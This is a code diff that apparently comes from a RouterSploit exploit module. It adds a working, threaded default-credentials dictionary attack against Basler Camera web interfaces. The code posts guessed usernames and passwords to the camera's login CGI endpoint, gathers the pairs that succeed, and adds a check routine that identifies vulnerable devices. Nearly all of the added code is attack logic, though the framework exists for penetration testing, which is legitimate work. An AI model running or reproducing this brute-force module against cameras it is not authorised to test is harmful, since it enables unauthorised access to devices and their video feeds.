@@ -7,12 +7,12 @@ class Exploit(HTTPClient):
         "name": "Basler Camera Default Web Interface Creds - HTTP Form",
         "description": "Module performs dictionary attack against Basler Camera Web Interface. "
                        "If valid credentials are found, they are displayed to the user.",
-        "authors": [
+        "authors": (
             "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
-        ],
-        "devices": [
+        ),
+        "devices": (
             "Basler Camera",
-        ]
+        )
     }
 
     target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
@@ -35,6 +35,7 @@ class Exploit(HTTPClient):
 
         print_status("Starting default creds attack against web interface")
 
+        data = LockedIterator(self.defaults)
         self.run_threads(self.threads, self.target_function, data)
 
         if self.credentials:
@@ -44,14 +45,52 @@ class Exploit(HTTPClient):
         else:
             print_error("Credentials not found")
 
-    def target_function(self, data):
-        pass
+    def target_function(self, running, creds):
+        while running.is_set():
+            try:
+                username, password = creds.next().split(":")
 
-    @mute
+                data = {
+                    "Auth.Username": username,
+                    "Auth.Password": password,
+                }
+                response = self.http_request(
+                    method="POST",
+                    path="/cgi-bin/auth_if.cgi?Login",
+                    data=data
+                )
+
+                if response and "success: true" in response.text:
+                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
+
+            except StopIteration:
+                break
+
     def check(self):
+        data = {
+            "Auth.Username": "",
+            "Auth.Password": "",
+        }
+        response = self.http_request(
+            method="POST",
+            path="/cgi-bin/auth_if.cgi?Login",
+            data=data
+        )
+
+        if response and "success: " in response.text:
+            return True
+
         return False
 
     @mute
     def check_default(self):
-        return None
+        if self.check():
+            self.credentials = []
 
+            data = LockedIterator(self.defaults)
+            self.run_threads(self.threads, self.target_function, data)
+
+            if self.credentials:
+                return self.credentials
+
+        return None
